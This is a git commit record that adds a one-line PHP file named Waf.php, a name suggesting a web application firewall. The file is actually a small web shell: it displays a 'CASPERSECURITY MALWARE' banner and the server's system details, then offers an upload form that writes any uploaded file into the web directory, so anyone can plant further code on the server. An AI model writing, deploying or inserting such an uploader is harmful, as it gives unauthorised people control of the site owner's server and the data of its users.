43849d223e9d2ab7cbb2147e8a2d3ad65b8efcc0
BIBIL <99636054+spacebin-org@users.noreply.github.com>
2023-05-25 02:37:12 +0200

    Create Waf.php

---
+++ Waf.php
@@ -0,0 +1,1 @@
+<?php echo '<pre><p>T.ME/CASPERSECURITY 𝐌𝐀𝐋𝐖𝐀𝐑𝐄  </p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
